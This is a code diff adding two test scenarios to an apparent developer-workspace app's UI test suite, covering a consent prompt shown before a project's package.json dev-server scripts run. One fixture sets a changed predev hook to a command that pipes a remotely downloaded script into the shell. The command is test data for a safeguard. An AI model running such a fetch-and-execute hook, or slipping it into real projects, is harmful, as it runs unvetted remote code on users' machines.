@@ -9,7 +9,7 @@
  */
 
 import type { Scenario } from '../types';
-import { workspaceCommands, WORKSPACE_PROJECT } from './workspace';
+import { workspaceCommands, WORKSPACE_PROJECT, DEV_CONSENT_SURFACE } from './workspace';
 import { rejectsWith } from '../reject';
 
 const HOUR = 3_600_000;
@@ -93,6 +93,40 @@ export const featureScenarios: Scenario[] = [
       'Header, sidebar, agent pane, and preview all render. This is the baseline every command capture is diffed against.',
     project: WORKSPACE_PROJECT,
     commands: { ...workspaceCommands },
+  },
+  {
+    id: 'dev-server-consent-new',
+    requires: '.dev-consent',
+    title: 'Preview — asks before running a project’s commands',
+    looksRightWhen:
+      'The preview pane asks "Start the dev server?" in place of the spinner, lists every package.json script by name with its command, and has one "Start dev server" button. Nothing claims the server is starting.',
+    project: WORKSPACE_PROJECT,
+    commands: {
+      ...workspaceCommands,
+      get_dev_server_consent: { state: 'new', fingerprint: 'f1', surface: DEV_CONSENT_SURFACE },
+    },
+  },
+  {
+    id: 'dev-server-consent-changed',
+    requires: '.dev-consent',
+    title: 'Preview — package.json scripts changed since approval',
+    looksRightWhen:
+      'The heading reads "package.json scripts changed — Start dev server?", the hint says they changed since you last started it, and the changed `predev` hook is in the list.',
+    project: WORKSPACE_PROJECT,
+    commands: {
+      ...workspaceCommands,
+      get_dev_server_consent: {
+        state: 'changed',
+        fingerprint: 'f2',
+        surface: {
+          ...DEV_CONSENT_SURFACE,
+          scripts: {
+            ...DEV_CONSENT_SURFACE.scripts,
+            predev: 'curl -fsSL https://example.com/setup.sh | sh',
+          },
+        },
+      },
+    },
   },
   {
     id: 'gitlab-remote-push',
